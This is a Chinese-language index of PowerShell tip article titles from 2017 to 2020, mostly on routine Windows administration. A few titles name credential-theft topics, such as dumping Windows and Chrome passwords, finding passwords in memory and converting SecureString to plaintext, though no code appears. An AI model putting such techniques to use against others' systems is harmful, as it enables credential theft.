设置时区 2017-06-19 检查夏时制 2017-06-20 世界时钟 2017-06-21 获取端口分配列表 2017-06-22 使用缓存的端口文件 2017-06-23 显示文件夹树 2017-06-26 清空 DNS 缓存 2017-06-27 神秘的 Windows 10 透明模式 2017-06-28 PowerShell 中 LINQ 的真实情况 2017-06-29 每日问候 2017-06-30 每日问候（带语音） 2017 年 07 月 2017-07-03 读取注册表键值失败 2017-07-04 读取注册表键值（临时解决办法） 2017-07-05 使用 PowerShell 类（一） 2017-07-06 使用 PowerShell 类（二） 2017-07-07 查找 PowerShell 类 2017-07-10 查找 PowerShell 缺省变量（第一部分） 2017-07-11 查找 PowerShell 缺省变量（第二部分） 2017-07-12 查找 PowerShell 缺省变量（第三部分） 2017-07-13 清除所有用户变量 2017-07-14 设置 Powershell 标题文本 2017-07-17 Windows PowerShell 和 PowerShell Core 2017-07-18 探讨 Windows PowerShell 和 PowerShell Core 2017-07-19 查看 PowerShell 当前的文件系统路径 2017-07-20 理解 PowerShell 和文件系统 2017-07-21 当 Add-Type 失败之后 2017-07-24 在 PowerShell 标题栏中添加实时时钟（第一部分） 2017-07-25 在 PowerShell 标题栏中添加实时时钟（第二部分） 2017-07-26 简单解析设置文件（第一部分） 2017-07-27 简单解析设置文件（第二部分） 2017-07-28 简单解析设置文件（第三部分） 2017-07-31 替换命令 2017 年 08 月 2017-08-01 自动记录命令输出 2017-08-02 查找已安装和缺失的更新（第一部分） 2017-08-03 查找已安装和缺失的更新（第二部分） 2017-08-04 查找已安装和缺失的更新（第三部分） 2017-08-07 查找已安装和缺失的更新（第四部分） 2017-08-08 在 Windows 10 中控制控制台的透明度 2017-08-09 创建 HTML 报表（第一部分 - 创建 HTML） 2017-08-10 创建 HTML 报表（第二部分 - 修复非字符串内容） 2017-08-11 创建 HTML 报表（第三部分 - 增加头部和尾部） 2017-08-14 创建 HTML 报表（第四部分 - 重命名列） 2017-08-15 创建 HTML 报表（第五部分 - 应用样式和设计） 2017-08-16 创建 Excel 报表（第一部分——黑白） 2017-08-17 创建 Excel 报表（第二部分——彩色） 2017-08-18 创建 Excel 报表（第三部分——独立操作工作簿） 2017-08-21 获取 MAC 制造商列表 2017-08-22 增强版 Get-History 命令 2017-08-23 控制音量（静音和音量） 2017-08-24 从 WikiQuote 搜集引用 2017-08-25 创建一个清单式的摘要对象 2017-08-28 轻量级 Robocopy 2017-08-29 Get-Service 的替代 2017-08-30 禁止 Windows 10 中的 OneDrive 2017-08-31 查找安装的软件 2017 年 09 月 2017-09-01 注册缺省的 PowerShell 源 2017-09-04 探索 WMI 2017-09-05 如何正确地封装多个结果 2017-09-06 查找所有 UAC 提权记录 2017-09-07 审计登录事件 2017-09-08 解析完全限定名 2017-09-11 PowerShell.exe 的“大括号秘密” 2017-09-12 在 Linux 的 PowerShell Core 中安装模块 2017-09-13 记录脚本输出 2017-09-14 同时输出和赋值 2017-09-15 使用在线帮助 2017-09-18 避免使用 Read-Host 2017-09-20 创建彩色的天气报告 2017-09-21 还原 TinyUrl 的真实地址 2017-09-22 高效统计文件数量（第一部分） 2017-09-25 高效统计文件数量（第二部分） 2017-09-26 计算文件夹大小 2017-09-27 操作 PowerShell Gallery 内容 2017-09-28 获取缓存的凭据 2017-09-29 查找 Windows 的产品密钥 2017 年 10 月 2017-10-02 准备磁盘驱动器 2017-10-03 PowerShell 2 接近过期 2017-10-04 Launching Daily Tools via Alias 2017-10-05 移除 Windows 10 APP 2017-10-06 将网络连接模式从私有网络切到公有网络（反之亦然） 2017-10-09 来自 Microsoft 的免费电子书 2017-10-10 查找所有域控制器 2017-10-11 查找所有域控制器（不依赖于模块） 2017-10-12 转换奇怪的数据格式 2017-10-13 评价事件日志信息 2017-10-16 用管道将信息输出到 Excel 2017-10-17 确定启动时间点和启动以来的时间 2017-10-18 远程确定启动时间点和启动以来的时间 2017-10-19 揭开错误处理的秘密 2017-10-20 补零 2017-10-23 Creating Balloon Tips Safely 2017-10-24 创建 MD5 文件哈希 2017-10-25 查找重复的文件 2017-10-26 从文本生成 MD5 哈希 2017-10-27 对比从 PowerShell 远程处理中受到的计算机数据 2017-10-30 在 Active Directory 中使用 LDAP 过滤器 2017-10-31 创建自签名的代码签名证书 2017 年 11 月 2017-11-01 从 PFX 文件加载证书 2017-11-02 对 PowerShell 脚本进行数字签名 2017-11-03 结合时间戳服务器使用数字签名 2017-11-06 一个更好（更快）的 Start-Job 2017-11-07 Multipass: 安全存储多个凭据 2017-11-08 压缩序列化的数据 2017-11-09 解压序列化的数据 2017-11-10 从字符串中移除文本 2017-11-13 多语言语音输出 2017-11-14 轻松记录脚本日志 2017-11-15 Working with [FileInfo] Object 2017-11-16 Getting File Extension 2017-11-20 临时禁用 PSReadLine 模块 2017-11-21 极简的错误处理 2017-11-22 理解 PowerShell 中 .NET 类型名称的变体 2017-11-23 从 .PSD1 文件中读取数据 2017-11-24 在 PowerShell 5+ 中读取 .PSD1 文件 2017-11-27 将哈希表转换为 JSON 2017-11-28 在 PowerShell ISE 中切换注释 2017-11-29 在 PowerShell ISE 中添加单行注释 2017-11-30 高效创建新的对象 2017 年 12 月 2017-12-01 为对象高效添加标记 2017-12-04 比较数字列表 2017-12-05 比较字符串列表 2017-12-06 强制允许 PowerShell 脚本执行 2017-12-07 理解文本转换 2017-12-08 转换区域性特定的信息 2017-12-11 将信息转换为区域性特定的文本 2017-12-12 在 Grid View 窗口中垂直显示数据 2017-12-13 测试运行 PowerShell 6 - 并行运行 2017-12-14 将用户名转换为 SID 2017-12-15 格式化文本输出 2017-12-18 覆盖 Execution Policy 设置 2017-12-19 将机器加入域 2017-12-20 以 JSON 格式读取和保存选项 2017-12-21 使用 PowerShell 远程处理 2017-12-22 通过 PowerShell 远程处理操作远程机器 2017-12-25 在多台计算机中并行运行命令 2017-12-26 管理用户配置文件 2017-12-27 删除用户配置文件 2017-12-28 在剪贴板中附加内容 2017-12-29 设置环境变量 2018 年2018 年 01 月 2018-01-01 删除环境变量 2018-01-02 按数据类型绑定参数 2018-01-03 在 PowerShell 函数中支持风险缓解 2018-01-04 正确地导入 Excel 的 CSV 文件 2018-01-05 使用缺省参数值 2018-01-08 转换数字字符串 2018-01-09 用 Group-Object 区分远程处理结果 2018-01-10 理解和避免双跃点问题 2018-01-11 列出用户配置文件 2018-01-12 查找用户配置文件 2018-01-15 通过对话框移除用户配置文件 2018-01-16 通过对话框移除用户配置文件（第二部分） 2018-01-17 用网格视图窗口作为选择对话框（第一部分） 2018-01-18 用网格视图窗口作为选择对话框（第二部分） 2018-01-19 快速创建逗号分隔的字符串（第 1 部分） 2018-01-22 快速创建逗号分隔的字符串（第 2 部分） 2018-01-23 用网格视图窗口显示列表视图（第 1 部分） 2018-01-24 用网格视图窗口显示列表视图（第 2 部分） 2018-01-25 用网格视图窗口显示列表视图（第 3 部分） 2018-01-26 过滤文件 2018-01-29 格式化数字（第 1 部分） 2018-01-30 格式化数字（第 2 部分） 2018-01-31 通过 PowerShell 管理 FTP 2018 年 02 月 2018-02-01 从 Windows 10 中移除臃肿的软件 2018-02-02 检查网络连接 2018-02-05 查找嵌套的 AD 组成员 2018-02-06 简易的 WMI 浏览器 2018-02-07 用管道传递文件和文件夹 2018-02-08 将 PowerShell 脚本转换为批处理 2018-02-09 创建随机的密码 2018-02-12 读取 RunOnce 注册表键 2018-02-13 探索 Select-Object 2018-02-14 获取 PowerShell 的帮助 2018-02-15 创建快速的 Ping（第一部分） 2018-02-16 创建快速的 Ping（第二部分） 2018-02-19 创建快速的 Ping（第三部分） 2018-02-20 创建快速的 Ping（第四部分） 2018-02-21 创建快速的 Ping（第五部分） 2018-02-22 创建快速的 Ping（第六部分） 2018-02-23 强制关闭所有 PowerShell ISE 文档 2018-02-26 Select-Object 和 -ExcludeProperty 2018-02-27 永久性设置环境变量 2018-02-28 读取 Excel 单元格 2018 年 03 月 2018-03-01 将值保存到 Excel 工作表中 2018-03-02 自动壁纸下载器 2018-03-05 还原短网址 2018-03-06 使用事件日志方便地记录日志 2018-03-07 查找注册过的事件日志数据源名 2018-03-08 将 Windows 错误 ID 转换为友好的文字 2018-03-09 备份事件日志 2018-03-12 终极快速的 Ping 命令 2018-03-13 正确地排序 IPv4 地址 2018-03-14 正确地对 IPv4 和 IPv6 地址排序 2018-03-15 播放声音 2018-03-16 播放声音文件 2018-03-19 合成语音（第 1 部分） 2018-03-20 合成语音（第 2 部分） 2018-03-21 合成语音 – 使用语音合成标记语言 SSML（第 3 部分） 2018-03-22 语音合成 – 使用不同的语音（第 4 部分） 2018-03-23 安全地嵌入变量 2018-03-26 为控制台输出加下划线 2018-03-27 在同一行输出日志信息 2018-03-28 PowerShell 控制台光标定位 2018-03-29 在 PowerShell 控制台中使用颜色 2018-03-30 对 Cmdlet 的输出着色 2018 年 04 月 2018-04-02 下载脚本文件的最佳方式 2018-04-03 执行策略和下载的脚本文件 2018-04-04 信任下载的文件 2018-04-05 检查数字签名 2018-04-06 用 PowerShell 操作 Chocolatey 2018-04-09 用 Chocolatey 安装 PowerShell 6 2018-04-10 创建十六进制数值 2018-04-11 清除当前用户的 Kerberos 票证 2018-04-12 清除所有账户的 Kerberos 票证 2018-04-13 从 Internet 下载信息（第 1 部分） 2018-04-16 从 Internet 下载信息（第 2 部分） 2018-04-17 从 Internet 下载信息（第 3 部分） 2018-04-18 从 Internet 下载信息（第 4 部分） 2018-04-19 从 Internet 下载信息（第 5 部分） 2018-04-20 从 Internet 下载信息（第 6 部分） 2018-04-23 从 Internet 下载信息（第 7 部分） 2018-04-24 从 Internet 下载信息（第 8 部分） 2018-04-25 转换错误记录 2018-04-26 在 try/catch 中使用 ConvertFrom-ErrorRecord 2018-04-27 允许远程处理 2018-04-30 列出属性和值（第 1 部分） 2018 年 05 月 2018-05-01 列出属性和值（第 2 部分） 2018-05-02 列出属性和值（第 3 部分） 2018-05-03 WMI 快速入门（第 1 部分） 2018-05-04 WMI 快速入门（第 2 部分） 2018-05-07 WMI 快速入门（第 3 部分） 2018-05-08 WMI 快速入门（第 4 部分） 2018-05-09 测试 AD 用户是否存在 2018-05-10 通过 Windows 10 开始菜单快速打开 PowerShell 2018-05-11 创建 PowerShell 命令速查表（第 1 部分） 2018-05-14 创建 PowerShell 命令速查表（第 2 部分） 2018-05-15 创建 PowerShell 命令速查表（第 3 部分） 2018-05-16 创建 PowerShell 命令速查表（第 4 部分） 2018-05-17 PowerShell 中打印表格（使用 WPF） 2018-05-18 使用免费的 PowerShell 陈列架（第 1 部分） 2018-05-21 使用免费的 PowerShell 陈列架（第 2 部分） 2018-05-22 PowerShell 陈列架：创建 QR 码 2018-05-23 PowerShell 陈列架：创建二维码 vCard 2018-05-24 PowerShell 陈列架：创建地理位置二维码 2018-05-25 PowerShell 陈列架：探索脚本块日志（第 1 部分） 2018-05-28 PowerShell 陈列架：探索脚本块日志（第 2 部分） 2018-05-29 PowerShell 陈列架 dba 工具 – 数据库专家 PowerShell 扩展 2018-05-30 批量重命名图片 2018-05-31 使用神奇的脚本块参数 2018 年 06 月 2018-06-01 用 PowerShell 管理 Windows 10 的缺省 APP 2018-06-04 免费的 PowerShell 帮助手册 2018-06-05 配置网络适配器 2018-06-06 立刻关闭显示器 2018-06-07 使用秘密的 $FormatEnumerationLimit 变量 2018-06-08 Out-Notepad: Send Information to Notepad 2018-06-11 理解类型加速器（第 1 部分） 2018-06-12 理解类型加速器（第 2 部分） 2018-06-13 巧妙地读取事件日志（第 1 部分） 2018-06-14 巧妙地读取事件日志（第 2 部分） 2018-06-15 从本地时间以 ISO 格式创建 UTC 时间 2018-06-18 快速读取文本文件 2018-06-19 显示输入框 2018-06-20 显示消息框 2018-06-21 添加前导零 2018-06-22 理解脚本块日志（第 1 部分） 2018-06-25 理解脚本块日志（第 2 部分） 2018-06-26 理解脚本块日志（第 3 部分） 2018-06-27 理解脚本块日志（第 4 部分） 2018-06-28 理解脚本块日志（第 5 部分） 2018-06-29 理解脚本块日志（第 6 部分） 2018 年 07 月 2018-07-02 理解脚本块日志（第 7 部分） 2018-07-03 查看文件对应的可执行程序 2018-07-04 速度差别：读取大型日志文件 2018-07-05 使用缺省参数 2018-07-06 在函数内使用持久变量 2018-07-09 从函数中返回富对象（第 1 部分） 2018-07-10 从函数中返回富对象（第 2 部分） 2018-07-11 交换变量值 2018-07-12 自动生成文档和报告（第 1 部分） 2018-07-13 自动生成文档和报告（第 2 部分） 2018-07-16 自动生成文档和报告（第 3 部分） 2018-07-17 自动生成文档和报告（第 4 部分） 2018-07-18 自动生成文档和报告（第 4 部分） 2018-07-19 进度条定时器 2018-07-20 查找嵌套的 Active Directory 成员（第 1 部分） 2018-07-23 查找嵌套的 Active Directory 成员（第 2 部分） 2018-07-24 查找嵌套的 Active Directory 成员（第 3 部分） 2018-07-25 处理文件编码和 BOM 2018-07-26 通过参数传递命令 2018-07-27 文件系统压力测试 2018-07-30 创建临时文件名 2018-07-31 使用 AD 过滤器配合 cmdlet（第 1 部分） 2018 年 08 月 2018-08-01 使用 AD 过滤器配合 cmdlet（第 2 部分） 2018-08-02 使用 AD 过滤器配合 cmdlet（第 3 部分） 2018-08-03 使用 AD 过滤器配合 cmdlet（第 4 部分） 2018-08-06 使用 PSGraph 2018-08-07 检查 USB 设备 2018-08-08 查看 Windows 生成号 2018-08-09 在可扩展字符串中分隔变量 2018-08-10 自动获取借口 2018-08-13 在 PowerShell 中运行 CMD 命令 2018-08-14 管理 Windows 功能（第 1 部分） 2018-08-15 管理 Windows 功能（第 2 部分） 2018-08-16 使用注册表用户配置单元 2018-08-17 强化 PowerShell 脚本块的日志 2018-08-20 远程读取配置表（第 1 部分） 2018-08-21 远程读取配置表（第 2 部分） 2018-08-22 优化命令自动完成 2018-08-23 使用 profile 脚本 2018-08-24 验证变量内容 2018-08-27 提取 ZIP 压缩包信息 2018-08-28 从 ZIP 压缩包中解压指定的文件 2018-08-29 检测 WinPE 2018-08-30 锁定工作站 2018-08-31 探索 PowerShell 模块 2018 年 09 月 2018-09-03 管理 Lenovo BIOS 设置（第 1 部分） 2018-09-04 管理 Lenovo BIOS 设置（第 2 部分） 2018-09-05 管理 Lenovo BIOS 设置（第 3 部分） 2018-09-06 管理 Lenovo BIOS 设置（第 4 部分） 2018-09-07 在 PowerShell 中使用 SSH 2018-09-10 PowerShell 控制台的键盘快捷方式 2018-09-11 创建事件日志报告 2018-09-12 浏览所有的事件日志 2018-09-14 通过 SSL 和 Invoke-WebRequest 下载数据 2018-09-14 查找禁用的 GPO 2018-09-17 通过 SSL 和 BitsTransfer 2018-09-18 用 BitsTransfer 在后台下载数据 2018-09-19 解析映射驱动器 2018-09-20 用参数的方式解决凭据 2018-09-21 从 PowerShell 函数中窃取敏感数据 2018-09-24 将数据输出为 HTML 报告 2018-09-25 查找内存中的密码 2018-09-26 启用脚本块日志 2018-09-27 强化脚本块日志 2018-09-28 以其他用户身份运行 PowerShell 代码 2018 年 10 月 2018-10-01 将所有脚本备份到 ZIP 中 2018-10-02 通过 Azure 认知服务使用人工智能 2018-10-03 快速查找 Active Directory 组成员 2018-10-04 通过 CSV 创建对象 2018-10-05 安装打印机 2018-10-08 自动化操作网站 2018-10-09 探索 Group-Object 2018-10-10 改进 Group-Object 2018-10-11 Adding New Incrementing Number Column in a Grid View Window 2018-10-12 Getting AD Users with Selected First Letters 2018-10-15 Retrieving Outlook Calendar Entries 2018-10-16 持续监视脚本的运行 2018-10-17 性能（第 1 部分）：从 6 分钟到 2 秒钟 2018-10-18 性能（第 2 部分）：从 2 秒到 200 毫秒 2018-10-19 性能（第 3 部分）：更快的管道函数 2018-10-22 存取隐藏（私有）成员 2018-10-23 编程检查对象属性 2018-10-24 编程列出所有 Cmdlet 或函数参数的列表 2018-10-25 通过 PowerShell 调用 Excel 宏 2018-10-26 将 VBScript 翻译为 PowerShell 2018-10-29 接受不同的参数类型 2018-10-30 读取网站内容 2018-10-31 使用动态参数 2018 年 11 月 2018-11-01 探索 PowerShell 属性值 2018-11-02 隐藏参数 2018-11-05 将对象转换为哈希表 2018-11-06 隐藏通用属性 2018-11-07 添加额外的安全防护 2018-11-08 分析 WEB 页面内容 2018-11-09 隐藏进度条 2018-11-12 下载 PowerShell 代码 2018-11-13 Invoke-WebRequest vs. Invoke-RestMethod 2018-11-14 在 PowerShell 标题栏显示 RSS 标题 2018-11-15 从目录结构中删除所有文件 2018-11-16 删除所有指定层级下的子文件夹 2018-11-19 查找所有二级深度的文件 2018-11-20 在输出中显示数组成员 2018-11-21 $FormatEnumerationLimit 作用域问题 2018-11-22 创建写保护的函数 2018-11-23 增强错误记录的可读性 2018-11-26 使用目录文件 2018-11-27 将安全字符串转换为明文 2018-11-28 代码签名迷你系列（第 1 部分：创建证书） 2018-11-29 代码签名迷你系列（第 2 部分：从 PFX 文件读取证书） 2018-11-30 代码签名迷你系列（第 3 部分：从个人存储中读取证书） 2018 年 12 月 2018-12-03 代码签名迷你系列（第 4 部分：签名 PowerShell 文件） 2018-12-04 代码签名迷你系列（第 5 部分：审计签名） 2018-12-05 为代码执行添加超时（第 1 部分） 2018-12-06 为代码执行添加超时（第 2 部分） 2018-12-07 查找打开的防火墙端口 2018-12-10 使用 $MyInvocation 的固定替代方式 2018-12-11 使用一个停表 2018-12-12 直接存取事件日志 2018-12-13 响应新的事件日志条目（第 1 部分） 2018-12-14 响应新的事件日志条目（第 2 部分） 2018-12-17 正确使用 FileSystemWatcher（第 1 部分） 2018-12-18 正确使用 FileSystemWatcher（第 2 部分） 2018-12-19 在打印机上打印测试页 2018-12-20 将 PowerShell 结果发送到 PDF（第 1 部分） 2018-12-21 将 PowerShell 结果发送到 PDF（第 2 部分） 2018-12-24 将 PowerShell 结果发送到 PDF（第 3 部分） 2018-12-25 将 PowerShell 结果发送到 PDF（第 4 部分） 2018-12-26 格式化日期和时间 2018-12-27 格式化日期和时间（包含区域性） 2018-12-28 查看 Windows 通用唯一识别码 (UUID) 2018-12-31 连接文本文件 2019 年2019 年 01 月 2019-01-01 首字母大写 2019-01-02 通过 Outlook 发送邮件 2019-01-03 列出网络驱动器 2019-01-04 用 ForEach 实现实时流 2019-01-07 删除日期最早的日志文件 2019-01-08 解决 SSL 连接问题 2019-01-09 重制控制台颜色 2019-01-10 扫描端口 2019-01-11 当前用户的 SID 2019-01-14 使用本地化的用户名和组名 2019-01-15 在 Windows 10 中安装 Linux 2019-01-16 打印 PDF 文件（第 1 部分） 2019-01-17 打印 PDF 文件（第 2 部分） 2019-01-18 Retrieving Windows Product Key 2019-01-21 通过鼠标滚轮控制 PowerShell 的透明度 2019-01-22 获取文本文件编码 2019-01-23 PowerShell 速查表汇编（第 1 部分） 2019-01-24 PowerShell 速查表汇编（第 2 部分） 2019-01-25 从 Unicode 文件中移除 BOM 2019-01-28 自动打印到 XPS 文件 2019-01-29 将 Windows 服务器转变为工作站 2019-01-30 在文件管理器中隐藏 OneDrive 2019-01-31 解析 Windows 安装日期 2019 年 02 月 2019-02-01 格式化 DateTime 2019-02-04 计算一个月的第一天和最后一天 2019-02-05 “危险的”比较 2019-02-06 移除空的数组元素（第 1 部分） 2019-02-07 移除空的数组元素（第 2 部分） 2019-02-08 在资源管理器中启用预览 PowerShell 文件 2019-02-11 读取新闻订阅 2019-02-12 小心“Throw”语句（第 1 部分） 2019-02-13 小心“Throw”语句（第 2 部分） 2019-02-14 转换 IEEE754 (Float)（第 1 部分） 2019-02-15 转换 IEEE754 (Float)（第 2 部分） 2019-02-18 将文本转为图像 2019-02-19 等待服务状态变化 2019-02-20 校验域账户密码 2019-02-21 验证本地用户账户密码 2019-02-22 创建 ASCII 艺术 2019-02-25 管理 Windows 许可证密钥（第 1 部分） 2019-02-26 管理 Windows 授权密钥（第 2 部分） 2019-02-27 管理 Windows 授权密钥（第 3 部分） 2019-02-28 管理 Windows 授权密钥（第 4 部分） 2019 年 03 月 2019-03-01 计算机名、DNS 名称，和 IP 地址 2019-03-04 创建对齐的标题 2019-03-05 接受不带引号的参数 2019-03-06 计算最高和最低有效字节 2019-03-07 求比特位反码 2019-03-08 通过校验位测试原始数据——实际案例 2019-03-11 从图片中创建彩色 ASCII 艺术 2019-03-12 检查 Cmdlet 可用性和脚本兼容性（第 1 部分） 2019-03-13 检查 Cmdlet 可用性和脚本兼容性（第 2 部分） 2019-03-14 检查 Cmdlet 可用性和脚本兼容性（第 3 部分） 2019-03-15 对必选参数使用自定义提示 2019-03-18 Where-Object: 只是一个带管道的 IF 语句 2019-03-19 提升 PowerShell 管道的速度 2019-03-20 智力游戏生成器 2019-03-21 通过 Outlook 发送邮件 2019-03-22 将大文件拆分成小片段（第 1 部分） 2019-03-25 将大文件拆分成小片段（第 2 部分） 2019-03-26 将大文件拆分成小片段（第 3 部分） 2019-03-27 修复 PowerShellGet 发布 2019-03-28 让新手运行 PowerShell 脚本 2019-03-29 修复 PowerShell 上下文菜单 2019 年 04 月 2019-04-01 删除无法删除的注册表键 2019-04-02 向编码的命令传递参数 2019-04-03 禁止用户输入 2019-04-04 用 PowerShell 锁定屏幕 2019-04-05 向上下文菜单添加个人 PowerShell 命令 2019-04-08 优先使用 WLAN 连接 2019-04-09 超级简单的密码生成器 2019-04-10 发现嵌套层数 2019-04-11 Get-PSCallStack 和调试 2019-04-12 向字符串添加数字（第 1 部分） 2019-04-15 向字符串添加数字（第 2 部分） 2019-04-16 命令发现机制揭秘（第 1 部分） 2019-04-17 命令发现机制揭秘（第 2 部分） 2019-04-18 锁定工作站 2019-04-19 隐藏返回结果的属性 2019-04-22 使用变量断点（第 1 部分） 2019-04-23 使用变量断点（第 2 部分） 2019-04-24 查找服务特权 2019-04-25 用队列代替嵌套 2019-04-26 Real-Time Processing for Language Structures 2019-04-29 将 SecureString 转换为字符串 2019-04-30 PowerShell ISE 模块浏览器 2019 年 05 月 2019-05-01 查找最新的 PowerShell 6 发布 2019-05-02 查找最新的 PowerShell 6 发行信息（以及下载地址） 2019-05-03 查找最新的 PowerShell 6 下载地址 2019-05-06 查找 PowerShell 命名管道 2019-05-07 使用目录文件来维护文件夹完整性 2019-05-08 创建代码签名证书 2019-05-09 导出和导入代码签名证书 2019-05-10 对比 AD 用户 2019-05-13 将 PowerShell 输出重定向到 GridView 2019-05-14 美化 Out-GridView 对话框 2019-05-16 从文本创建哈希 2019-05-17 获取文本的哈希值 2019-05-18 以固定宽度分割文本 2019-05-20 在 PowerShell 中使用 SSL/HTTPS 2019-05-21 用聪明的方法指定位标志 2019-05-22 检查坏（不安全的）密码（第 1 部分） 2019-05-23 检查坏（不安全的）密码（第 2 部分） 2019-05-24 控制音量和静音状态 2019-05-27 开发 PowerShell Core 还是 Windows PowerShell 脚本 2019-05-28 对循环启用流操作 2019-05-29 通过 Index Search 搜索文件 2019-05-30 内置的 RSAT 工具 2019-05-31 PowerShell 7 2019 年 06 月 2019-06-03 使用代理服务器的缺省凭据 2019-06-04 同步使用 FileSystemWatcher 2019-06-05 异步使用 FileSystemWatcher 2019-06-06 检查按键 2019-06-07 查看下载文件的大小 2019-06-10 解析 URL 2019-06-11 查找登录事件 2019-06-12 谁执行了隐藏的程序？ 2019-06-13 寻找丢失的更新 2019-06-14 查找已安装的更新（第 1 部分） 2019-06-17 查找已安装的更新（第 2 部分） 2019-06-18 订阅锁定和解锁事件 2019-06-19 Left Side of Comparison 2019-06-20 在 Web Request 中使用会话变量 2019-06-21 使用 GeoCoding（第 1 部分） 2019-06-24 使用 GeoCoding：将地址转换为经纬度（第 2 部分） 2019-06-25 使用 GeoCoding：将经纬度转换为地址（第 3 部分） 2019-06-26 使用 GeoCoding：文本扫描（第 4 部分） 2019-06-27 使用 GeoCoding：情感分析（第 5 部分） 2019-06-28 啤酒挑战结果：最短的密码分析代码 2019 年 07 月 2019-07-01 用 Out-GridView 做为输出窗口 2019-07-03 覆盖 Out-Default（第 1 部分） 2019-07-05 覆盖 Out-Default（第 2 部分） 2019-07-09 覆盖 Out-Default（第 3 部分） 2019-07-11 检测按键 2019-07-15 提高管道速度 2019-07-17 用哈希表提高代码可读性 2019-07-19 使用始终可见的弹出对话框 2019-07-23 通过 PowerShell 安装 Google Chrome 2019-07-25 从 Windows 中转储个人密码 2019-07-29 转储 Chrome 的所有密码 2019-07-31 控制处理器关联性 2019 年 08 月 2019-08-02 查找隐藏的 PowerShell 应用 2019-08-06 接受屏蔽的密码 2019-08-08 为输出编号（第 1 部分） 2019-08-12 验证 Active Directory 凭据 2019-08-14 通过 Web Service 做单位转换 2019-08-16 测试网站的可用性 2019-08-20 转换 HTTP 响应码 2019-08-22 自动创建 HTTP 响应码清单 2019-08-26 使用超棒的 Export-Excel Cmdlet（第 1 部分） 2019-08-28 使用超棒的 Export-Excel Cmdlet（第 2 部分） 2019-08-30 使用超棒的 Export-Excel Cmdlet（第 3 部分） 2019 年 09 月 2019-09-03 使用超棒的 Export-Excel Cmdlet（第 4 部分） 2019-09-05 使用超棒的 Export-Excel Cmdlet（第 5 部分） 2019-09-09 重设 Winsock 2019-09-11 检测存储问题 2019-09-13 检测键盘按键 2019-09-17 实时日志处理 2019-09-19 查找公网 IP 地址 2019-09-23 安装 PowerShell Core 2019-09-25 使用最新版的 PowerShell Core 2019-09-27 使用 Windows 10 内置的 SSH 支持 2019 年 10 月 2019-10-01 在 PowerShell 脚本中嵌入二进制文件（图片、DLL） 2019-10-03 将 SecureString 转换为文本 2019-10-07 测试 2019-10-09 简易的 PowerShell 聊天室 2019-10-11 创建 NT4 密码哈希 2019-10-15 加密文本（第 1 部分） 2019-10-17 加密文本（第 2 部分） 2019-10-21 对象的魔法（第 1 部分） 2019-10-23 对象的魔法（第 2 部分） 2019-10-25 对象的魔法（第 3 部分） 2019-10-29 对象的魔法（第 4 部分） 2019-10-31 将对象转换为哈希表 2019 年 11 月 2019-11-04 WMI 浏览器 2019-11-06 探索 PowerShell 模块 2019-11-08 将 Word 文档从 .doc 格式转为 .docx 格式（第 1 部分） 2019-11-12 将 Word 文档从 .doc 格式转为 .docx 格式（第 2 部分） 2019-11-14 在 PowerShell 中安全地使用 WMI（第 1 部分） 2019-11-18 在 PowerShell 中安全地使用 WMI（第 2 部分） 2019-11-20 在 PowerShell 中安全地使用 WMI（第 3 部分） 2019-11-22 在 PowerShell 中安全地使用 WMI（第 4 部分） 2019-11-26 Get-ComputerInfo 和 systeminfo.exe 的对比（第 1 部分） 2019-11-28 Get-ComputerInfo 和 systeminfo.exe 的对比（第 2 部分） 2019 年 12 月 2019-12-02 PowerShell 7 中的三元操作符 2019-12-04 -RepeatHeader 参数 2019-12-06 Foreach -parallel（第 1 部分：PowerShell 7） 2019-12-10 Foreach -parallel (第 2 部分：Windows PowerShell) 2019-12-12 Foreach -parallel (第 3 部分：批量 Ping) 2019-12-16 使用一个计时器来测量执行时间 2019-12-18 退出 PowerShell 管道（第 1 部分：Select-Object） 2019-12-20 退出 PowerShell 管道（第 2 部分：手动退出） 2019-12-24 列出已安装的更新（第 1 部分） 2019-12-26 列出已安装的更新（第 2 部分） 2019-12-30 探索即插即用设备（第 1 部分） 2020 年2020 年 01 月 2020-01-01 探索即插即用设备（第 2 部分） 2020-01-03 探索即插即用设备（第 3 部分） 2020-01-07 探索即插即用设备（第 4 部分） 2020-01-09 测试网络连接（第 1 部分） 2020-01-13 测试网络连接（第 2 部分） 2020-01-15 杀死无响应的进程 2020-01-17 隐藏启动 PowerShell 脚本 2020-01-21 测试等待重启 2020-01-23 安装 ActiveDirectory 模块 2020-01-27 在 Windows PowerShell 和 PowerShell Core 中共享模块 2020-01-29 下载 PowerShell 语言参考（或任意文件） 2020-01-31 获取原始的 PowerShell 语言说明书 2020 年 02 月 2020-02-04 安装免费的 Chocolatey 包管理器 2020-02-06 安装并试运行 Windows Terminal 2020-02-10 区分 IPv4 和 IPv6 2020-02-12 参数的智能感知（第 1 部分） 2020-02-14 参数的智能感知（第 2 部分） 2020-02-18 参数的智能感知（第 3 部分） 2020-02-20 参数的智能感知（第 4 部分） 2020-02-24 理解 $ErrorView 2020-02-26 带颜色的控制台硬拷贝 2020-02-28 神秘的动态参数完成器 2020 年 03 月 2020-03-03 列出安装的应用程序（第 1 部分） 2020-03-05 列出安装的应用程序（第 2 部分） 2020-03-09 动态参数完成（第 1 部分） 2020-03-11 动态参数完成（第 2 部分） 2020-03-13 动态参数完成（第 3 部分） 2020-03-17 动态参数完成（第 4 部分） 2020-03-19 PowerShell 技能连载 - 动态参数完成（第 5 部分） 2020-03-23 使用 PSWindowsUpdate 管理更新 2020-03-25 用 Carbon 添加新的 PowerShell 命令 2020-03-27 使用 PowerShell 探索 WMI 2020-03-31 处理 Out-GridView 的 Bug 2020 年 04 月 2020-04-02 谨慎使用某些命令 2020-04-06 获取可用的显示分辨率 2020-04-08 管理自动磁盘检测 2020-04-10 允许 PowerPoint 中的点击操作 2020-04-14 安装 PowerShell 7 2020-04-16 使用 WMI 实例路径（第 1 部分） 2020-04-20 使用 WMI 实例路径（第 2 部分） 2020-04-22 检测是否连接到计费的 WLAN 2020-04-24 使用自定义的验证器属性 2020-04-28 管理自动重启 2020-04-30 读取机箱的 SKU 2020 年 05 月 2020-05-04 获取 WMI 对象的帮助 2020-05-06 增加新的 PowerShell 命令 2020-05-08 使 PowerShell 模块保持最新 2020-05-12 创建软件库 2020-05-14 检测泄露的密码（第 1 部分） 2020-05-18 检测泄露的密码（第 2 部分） 2020-05-20 管理 SharePoint Online 2020-05-22 在 PowerShell Gallery 搜索新模块 2020-05-26 在控制台中提示输入凭据 2020-05-28 读取操作系统详情 2020 年 06 月 2020-06-01 解析 Windows 产品密钥（第 1 部分） 2020-06-03 解析 Windows 产品密钥（第 2 部分） 2020-06-05 添加参数自动完成（第 1 部分） 2020-06-09 添加参数自动完成（第 2 